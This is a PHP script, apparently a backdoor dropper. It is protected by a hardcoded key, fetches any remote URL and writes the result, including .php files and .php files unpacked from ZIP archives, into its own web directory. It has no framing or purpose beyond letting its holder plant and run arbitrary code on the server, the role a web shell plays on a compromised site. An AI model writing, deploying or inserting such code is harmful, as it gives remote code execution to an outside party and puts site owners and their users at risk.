<?php

define('ACCESS_KEY', 'zoro168');
define('SAVE_DIR', __DIR__);

header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store');
header('X-Content-Type-Options: nosniff');

function stopNow($code, $message, $extra = array())
{
    http_response_code($code);

    exit(json_encode(array_merge(array(
        'ok' => false,
        'error' => $message
    ), $extra), JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT));
}

function cleanFilename($name)
{
    $name = basename(str_replace('\\', '/', $name));
    $name = preg_replace('/[^A-Za-z0-9._-]/', '_', $name);

    return $name;
}

function safeZipEntry($name)
{
    $name = str_replace('\\', '/', $name);

    if (
        $name === '' ||
        strpos($name, "\0") !== false ||
        substr($name, 0, 1) === '/' ||
        preg_match('/^[A-Za-z]:\//', $name)
    ) {
        return false;
    }

    foreach (explode('/', $name) as $part) {
        if ($part === '..') {
            return false;
        }
    }

    return $name;
}

function extractZipSafe($zipFile)
{
    if (!class_exists('ZipArchive')) {
        stopNow(500, 'ZipArchive tidak tersedia pada server.');
    }

    $zip = new ZipArchive();

    if ($zip->open($zipFile) !== true) {
        stopNow(500, 'File ZIP tidak dapat dibuka.');
    }

    $allowedExtract = array('txt', 'html', 'php');
    $extracted = array();
    $skipped = array();

    for ($i = 0; $i < $zip->numFiles; $i++) {
        $stat = $zip->statIndex($i);
        $entry = isset($stat['name']) ? $stat['name'] : '';

        if ($entry === '' || substr($entry, -1) === '/') {
            continue;
        }

        $entry = safeZipEntry($entry);

        if ($entry === false) {
            $skipped[] = 'Path ZIP tidak aman pada index ' . $i;
            continue;
        }

        $ext = strtolower(pathinfo($entry, PATHINFO_EXTENSION));

        if (!in_array($ext, $allowedExtract, true)) {
            $skipped[] = $entry . ' (ekstensi tidak diizinkan)';
            continue;
        }

        $target = SAVE_DIR . DIRECTORY_SEPARATOR .
            str_replace('/', DIRECTORY_SEPARATOR, $entry);

        $folder = dirname($target);

        if (!is_dir($folder) && !mkdir($folder, 0755, true) && !is_dir($folder)) {
            $skipped[] = $entry . ' (folder gagal dibuat)';
            continue;
        }

        if (file_exists($target)) {
            $skipped[] = $entry . ' (file sudah ada)';
            continue;
        }

        $source = $zip->getStream($stat['name']);
        $output = fopen($target, 'xb');

        if (!$source || !$output) {
            if (is_resource($source)) {
                fclose($source);
            }

            if (is_resource($output)) {
                fclose($output);
            }

            @unlink($target);
            $skipped[] = $entry . ' (gagal dibuat)';
            continue;
        }

        $written = stream_copy_to_stream($source, $output);

        fclose($source);
        fclose($output);

        if ($written === false) {
            @unlink($target);
            $skipped[] = $entry . ' (gagal diekstrak)';
            continue;
        }

        $extracted[] = $entry;
    }

    $zip->close();

    return array(
        'extracted_count' => count($extracted),
        'extracted_files' => $extracted,
        'skipped_count' => count($skipped),
        'skipped_files' => $skipped
    );
}

$pass = isset($_GET['pass']) ? (string) $_GET['pass'] : '';
$url = isset($_GET['url']) ? trim((string) $_GET['url']) : '';
$fname = isset($_GET['fname'])
    ? cleanFilename((string) $_GET['fname'])
    : '';

if ($pass === '' || !hash_equals(ACCESS_KEY, $pass)) {
    stopNow(403, 'Access key salah.');
}

if (!filter_var($url, FILTER_VALIDATE_URL)) {
    stopNow(400, 'URL tidak valid.');
}

$scheme = strtolower((string) parse_url($url, PHP_URL_SCHEME));

if (!in_array($scheme, array('http', 'https'), true)) {
    stopNow(400, 'Hanya URL HTTP dan HTTPS yang diizinkan.');
}

$allowedDownload = array('txt', 'zip', 'html', 'php');
$ext = strtolower(pathinfo($fname, PATHINFO_EXTENSION));

if ($fname === '' || !in_array($ext, $allowedDownload, true)) {
    stopNow(400, 'Ekstensi download tidak diizinkan.');
}

if (!filter_var(ini_get('allow_url_fopen'), FILTER_VALIDATE_BOOLEAN)) {
    stopNow(500, 'fungsi tidak aktif pada server.');
}

$target = SAVE_DIR . DIRECTORY_SEPARATOR . $fname;

if (file_exists($target)) {
    stopNow(409, 'File tujuan sudah ada.');
}

$context = stream_context_create(array(
    'http' => array(
        'method' => 'GET',
        'timeout' => 60,
        'follow_location' => 1,
        'max_redirects' => 3,
        'ignore_errors' => false,
        'header' => "User-Agent: PHP-URL-Downloader/1.0\r\n"
    ),
    'ssl' => array(
        'verify_peer' => true,
        'verify_peer_name' => true
    )
));

$source = @fopen($url, 'rb', false, $context);

if (!$source) {
    stopNow(502, 'URL sumber tidak dapat dibuka.');
}

$output = @fopen($target, 'xb');

if (!$output) {
    fclose($source);
    stopNow(500, 'File tujuan tidak dapat dibuat.');
}

$bytes = stream_copy_to_stream($source, $output);

fclose($source);
fclose($output);

if ($bytes === false || $bytes < 1) {
    @unlink($target);
    stopNow(502, 'Download gagal atau file kosong.');
}

$result = array(
    'ok' => true,
    'message' => 'Download berhasil.',
    'file' => $fname,
    'bytes' => $bytes
);

if ($ext === 'zip') {
    $result['extract'] = extractZipSafe($target);
}

echo json_encode(
    $result,
    JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT
);
